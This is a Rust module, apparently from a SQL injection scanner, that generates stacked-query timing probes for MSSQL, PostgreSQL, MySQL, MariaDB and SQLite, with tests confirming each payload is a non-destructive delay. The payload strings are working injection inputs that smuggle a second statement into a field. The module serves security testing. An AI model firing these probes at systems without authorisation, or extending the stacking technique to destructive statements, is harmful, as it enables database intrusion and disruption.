//! Stacked-query SQL injection generators.
//!
//! A stacked query smuggles a *second, complete statement* after the one the
//! application meant to run, separated by `;`. Whether it executes at all is a
//! property of the database driver, not the SQL dialect: PDO/`sqlsrv`/`psql`
//! multi-statement modes allow it, `mysqli_query` and most default MySQL
//! drivers do not. That makes stacking a distinct capability worth probing on
//! its own — a target immune to inline injection can still be fully
//! compromised through a stacked statement.
//!
//! Confirmation is timing-based: each payload stacks a **benign delay**
//! (`pg_sleep`, `WAITFOR DELAY`, `SLEEP`) and nothing else. If the stacked
//! statement runs, the response is late and `run_payloads` attributes the
//! delay to `expected_dbms`; if stacking is refused, the delay never fires and
//! nothing is claimed. No data is written or destroyed — these are read-only
//! probes for a capability, not exploitation payloads.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Nominal stacked delay (seconds); mirrors [`super::time_based::DELAY_SECS`].
pub const DELAY_SECS: u32 = 5;

fn probe(name: &str, payload: &str, dbms: DbmsFamily) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::TimingProbe,
        payload_str: payload.to_string(),
        expected_dbms: Some(dbms),
        // Stacking terminates the current statement, so the clause context is
        // always a fresh statement rather than a sub-expression.
        clause: Some(SqlClause::Select),
    }
}

pub fn generate() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        // --- MSSQL -----------------------------------------------------------
        // The canonical stacked target: `sqlsrv`/ADO happily run batches.
        probe("stacked-mssql-waitfor", "';WAITFOR DELAY '0:0:5'-- -", MSSQL),
        // --- PostgreSQL ------------------------------------------------------
        // libpq's simple-query protocol executes semicolon-separated batches.
        probe("stacked-pg-sleep", "';SELECT pg_sleep(5)-- -", PostgreSQL),
        // --- MySQL / MariaDB -------------------------------------------------
        // Only fires under multi-statement drivers (PDO with emulated
        // prepares, mysqli_multi_query); a negative here is informative.
        probe("stacked-mysql-sleep", "';SELECT SLEEP(5)-- -", MySQL),
        probe("stacked-mariadb-sleep", "';SELECT SLEEP(5)-- -", MariaDB),
        // --- SQLite ----------------------------------------------------------
        // sqlite3_exec runs multiple statements; no sleep primitive, so stack a
        // heavy CPU statement whose latency is the tell.
        probe(
            "stacked-sqlite-heavy",
            "';SELECT 1 FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<15000000) SELECT count(*) FROM c)-- -",
            SQLite,
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_stacks_a_statement() {
        for p in generate() {
            assert!(
                p.payload_str.contains(';'),
                "stacked payload must terminate and start a new statement: {}",
                p.payload_str
            );
        }
    }

    #[test]
    fn all_are_timing_probes() {
        assert!(generate().iter().all(|p| p.probe_type == ProbeType::TimingProbe));
    }

    #[test]
    fn stacked_statements_are_read_only() {
        // Capability detection only — never destructive DML/DDL.
        for p in generate() {
            let s = p.payload_str.to_uppercase();
            for forbidden in ["DROP ", "DELETE ", "INSERT ", "UPDATE ", "TRUNCATE ", "ALTER "] {
                assert!(!s.contains(forbidden), "destructive stacked payload: {}", p.payload_str);
            }
        }
    }

    #[test]
    fn covers_the_common_stacking_backends() {
        let fams: Vec<_> = generate().into_iter().filter_map(|p| p.expected_dbms).collect();
        for fam in [DbmsFamily::MSSQL, DbmsFamily::PostgreSQL, DbmsFamily::MySQL] {
            assert!(fams.contains(&fam), "no stacked probe for {fam:?}");
        }
    }
}
